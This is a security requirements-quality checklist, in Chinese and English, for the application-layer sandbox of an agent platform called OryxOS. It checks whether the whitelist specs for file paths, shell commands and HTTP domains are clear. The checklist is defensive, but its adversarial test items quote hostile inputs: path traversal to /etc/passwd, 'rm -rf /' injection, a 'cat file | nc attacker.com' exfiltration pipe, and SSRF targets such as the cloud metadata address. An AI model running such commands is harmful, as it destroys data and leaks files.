# Security Requirements Quality Checklist — OryxOS v1.0 应用层 Sandbox

**Purpose**: 对应用层 Sandbox 的需求做"英语单元测试"——验证 [spec.md §FR-021/027/028](../spec.md) / [plan.md §D12](../research.md) / [tasks.md §T041-T042](../tasks.md) 在安全维度上的需求质量
**Created**: 2026-08-07
**Feature**: [spec.md](../spec.md) / [plan.md](../plan.md) / [research.md](../research.md)
**Theme**: security（应用层 Sandbox 专一）
**Audience**: Reviewer（PR 视角，标准深度）
**Actor timing**: 进入 US-4 (Plugin Tool 体系) 实施前的最后一道闸门

> **方法论**：每条 item 评估**需求本身**的清晰度、完备性、一致性、可测性，**不**评估实现是否对。每条 item 形如"需求是否...?"而不是"系统是否...?"。

---

## Requirement Completeness（需求是否齐备）

- [ ] CHK001 — Are all 3 whitelist categories explicitly enumerated in the spec (file path / shell command / HTTP domain), with no implicit categories left unspecified? [Completeness, Spec §FR-021, research.md §D12]
- [ ] CHK002 — Are the 8 builtin Tools (read_file / write_file / list_dir / shell / http_get / http_post / save_memory / recall_memory) explicitly cross-referenced to which of the 3 whitelists they must traverse? [Completeness, Spec §FR-026]
- [ ] CHK003 — Is the whitelist default value documented (e.g., "shell: `ls/cat/grep/awk/sed/find/echo/python/node`" vs "agent's home directory only")? [Completeness, Gap, Spec §FR-027]
- [ ] CHK004 — Are notification Tools (notify_slack / notify_webhook) explicitly identified as **outside** the Sandbox whitelist scope, given they don't take a file/shell/HTTP-from-agent input but invoke pre-configured endpoints? [Completeness, Gap]
- [ ] CHK005 — Is the MCP Tool invocation flow (McpClientService → tool → agent) specified to inherit the same Sandbox discipline (or explicitly excluded)? [Completeness, Gap, Spec §FR-049]

---

## Requirement Clarity（需求是否清晰可执行）

- [ ] CHK006 — Is the path whitelist matching algorithm precisely defined (prefix? normalized? symlink-resolved? case-sensitive on which platforms)? [Clarity, Spec §FR-027]
- [ ] CHK007 — Is the shell command whitelist matching precisely defined: matches `argv[0]` (basename)? matches full resolved path? forbids shell metacharacters (`;`, `|`, `&&`, backticks)? [Clarity, Spec §FR-027]
- [ ] CHK008 — Is the HTTP domain whitelist matching precisely defined: exact host match? suffix match (e.g., `*.example.com`)? port matching? scheme matching (http vs https)? IP literal handling? [Clarity, Spec §FR-027]
- [ ] CHK009 — Is the rejection error semantics explicitly defined for each whitelist (status code, structured error code, allowed retry / non-retry indicator)? [Clarity, Spec §FR-028 / §Edge Cases]
- [ ] CHK010 — Is "agent 自己发的请求" vs "Tool 发出的请求" distinguished in the HTTP domain whitelist (LLM-call from inside Tool is a different trust boundary than user-specified URL)? [Clarity, Gap]

---

## Requirement Consistency（需求是否前后一致）

- [ ] CHK011 — Is the "100% white-list validation" criterion (SC-012) consistent with FR-027 wording (FR-027 says "MUST" but doesn't quantify; SC-012 quantifies "100%")? [Consistency, Spec §FR-027 / §SC-012]
- [ ] CHK012 — Is the timeout requirement (FR-028 "单次调用超时") consistent with the rest of the spec's timeout conventions (e.g., FR-051 Agent 同步 60s, FR-049 MCP 5s)? [Consistency, Spec §FR-028 / §FR-049 / §FR-051]
- [ ] CHK013 — Does the description of `Sandbox` (应用层白名单实现 vs 容器隔离) in plan.md / research.md §D12 align with FR-027 (which says "应用层白名单" without mentioning "容器级" alternative)? [Consistency, plan.md §D12]

---

## Acceptance Criteria Quality（验收标准是否可测）

- [ ] CHK014 — Is "100% white-list validation" (SC-012) measurable via an automated metric (e.g., "0 unauthorized invocations across 1000 random tool calls in adversarial test suite")? [Measurability, Spec §SC-012]
- [ ] CHK015 — Are there concrete adversarial test scenarios required for Sandbox (e.g., path traversal `../../etc/passwd`, command injection `; rm -rf /`, SSRF via `localhost` HTTP)? [Measurability, Spec §SC-012]
- [ ] CHK016 — Is the Sandbox latency overhead bounded as a measurable SC (e.g., "Sandbox 校验 MUST < 5ms per Tool invocation")? [Measurability, Gap]

---

## Scenario Coverage（场景覆盖度）

- [ ] CHK017 — Are symlink-based path escape attempts specified (e.g., `.oryxos/agents/foo/scripts/../../etc/passwd`) as a Sandbox-rejected scenario? [Coverage, Edge Case, Gap]
- [ ] CHK018 — Are shell pipe / chained command injection scenarios specified as Sandbox-rejected (e.g., `ls; rm -rf /`, `cat file | nc attacker.com`)? [Coverage, Edge Case, Gap]
- [ ] CHK019 — Are SSRF-style HTTP scenarios specified: localhost / 127.0.0.1 / 169.254.169.254 (cloud metadata) / file:// scheme? [Coverage, Edge Case, Gap]
- [ ] CHK020 — Are scenarios specified where the whitelist configuration itself is malformed (empty list? non-existent path? invalid domain syntax)? [Coverage, Gap]
- [ ] CHK021 — Is the behavior defined when an Agent's `tools` list references a Tool name not registered in ToolRegistry (unauthorized invocation path)? [Coverage, Spec §FR-032]

---

## Edge Case Coverage（边界情况覆盖）

- [ ] CHK022 — Is the case-sensitivity of path matching defined for cross-platform portability (Windows vs Linux)? [Edge Case, Spec §FR-027]
- [ ] CHK023 — Is the behavior defined when `ORYXOS_HOME` is not set (whitelist path becomes `${ORYXOS_HOME}/**` → empty / undefined)? [Edge Case, Gap]
- [ ] CHK024 — Is the behavior defined when the same Tool is invoked concurrently from two parallel Sessions with conflicting whitelist states (e.g., one Agent's path allowed, another disallowed)? [Edge Case, Gap]
- [ ] CHK025 — Is the behavior defined when the Sandbox config is reloaded mid-flight (does running Tool use old or new whitelist)? [Edge Case, Gap]

---

## Non-Functional Requirements（非功能性需求）

- [ ] CHK026 — Is Sandbox validation specified to fail CLOSED (any ambiguous input → reject) vs FAIL OPEN (any ambiguous input → allow with warning)? [Non-Functional, Spec §FR-027]
- [ ] CHK027 — Is the Sandbox exception handling specified (does `SandboxDeniedException` propagate to caller as 4xx, or as Agent final-response-with-error)? [Non-Functional, Spec §Error Handling]
- [ ] CHK028 — Are the audit record fields for sandbox-rejected attempts explicitly defined (separate from successful invocations, with rejection reason)? [Non-Functional, Spec §FR-044]

---

## Dependencies & Assumptions（依赖与假设）

- [ ] CHK029 — Is the assumption that "应用层白名单 = 充分防御" explicitly marked as a NON-defensive boundary (per research.md §D12 "劝阻级 — 防模型失误不防对抗")? [Assumption, research.md §D12]
- [ ] CHK030 — Is the dependency on `ORYXOS_HOME` env var / `application.yml` `oryxos.sandbox.*` keys documented as authoritative configuration source (not from Agent frontmatter)? [Dependency, plan.md §Sandbox config]

---

## Traceability Summary

| Item | Spec section | Plan / Research | Task |
|------|--------------|-----------------|------|
| CHK001 | FR-021 / FR-027 | research.md §D12 | T041-T042 |
| CHK002 | FR-026 | — | T036-T040 |
| CHK006 | FR-027 | research.md §D12 (path prefix) | T042 |
| CHK007 | FR-027 | research.md §D12 (shell whitelist) | T042 |
| CHK008 | FR-027 | research.md §D12 (HTTP domain) | T042 |
| CHK011 | FR-027 / SC-012 | — | T042 / T087 |
| CHK017-CHK019 | — (gap) | — | T042 |
| CHK026 | FR-027 | research.md §D12 | T042 |
| CHK028 | FR-044 | data-model.md §5 | T016 |

**Traceability coverage**: 9/30 items explicitly mapped (~30%). Below the 80% SKILL.md recommended threshold. Recommend adding explicit cross-references in spec.md or research.md for the 21 unmapped items before US-4 implementation.

---

## High-Impact Gaps Surfaced — Disposition（建议补到 spec.md）

If any of the following gaps are confirmed as requirements that should exist, they should be added to spec.md as new FR before US-4 implementation:

| # | Gap | Status (2026-08-07) | Where resolved |
|---|-----|---------------------|----------------|
| 1 | **CHK006 path matching algorithm** | ✅ Resolved as inline note | [tasks.md T042](../tasks.md) — 严格算法表 |
| 2 | **CHK007 shell matching** | ✅ Resolved as inline note | [tasks.md T042](../tasks.md) — 严格算法表 |
| 3 | **CHK008 HTTP domain** | ✅ Resolved as inline note | [tasks.md T042](../tasks.md) — 严格算法表 |
| 4 | **CHK019 SSRF defense** | ⏸ Deferred to extension phase | [spec.md §Out of Scope](../spec.md) — 内网假设下不做 |
| 5 | **CHK026 fail-closed** | ✅ Resolved as **FR-056** | [spec.md §FR-056](../spec.md) |
| 6 | **CHK028 sandbox rejection audit** | ✅ Resolved as schema field + T016 inline note | [data-model.md §5 `rejection_reason`](../data-model.md) + [tasks.md T016](../tasks.md) |

**Net effect**:
- 1 项升 FR（宪法红线级，CHUNK-2 fail-closed）
- 3 项以 tasks.md inline note 形式就地解析（US-4 实施时不必再回头找 spec）
- 1 项扩阶段做（SSRF，标注内网假设）
- 1 项扩字段（`rejection_reason`，data-model + tasks T016 同步）

---

## Items Not Applicable (NA, Recorded for Completeness)

The following were considered but excluded because they are out of scope for **应用层 Sandbox** specifically:

- Authentication / authorization (covered separately in api.md CHK027, FR-055)
- Network-layer encryption (HTTPS, TLS versions)
- Database-level encryption (SQLite TDE)
- Key management / KMS integration (extension phase)
- Container-level sandboxing (extension phase per research.md §D12)

---

## Sign-off

- [x] All requirements quality gaps above are either:
  - (a) Added as new FR-056 in spec.md / data-model.md, OR
  - (b) Marked as Deferred to extension phase with rationale (SSRF), OR
  - (c) Resolved as tasks.md inline note at T016 / T041 / T042 (US-4 implement gate)

---

## 引用

- [spec.md §FR-021 / §FR-027 / §FR-028 / §SC-012](../spec.md)
- [plan.md §D12](../plan.md)
- [research.md §D12](../research.md) — 应用层白名单决策
- [data-model.md §5](../data-model.md) — ToolInvocationRecord
- [tasks.md §T041-T042 / §T087](../tasks.md) — Sandbox 实现 + 测试
- [api.md](./api.md) — 已跑的 API checklist（与本 checklist 互补）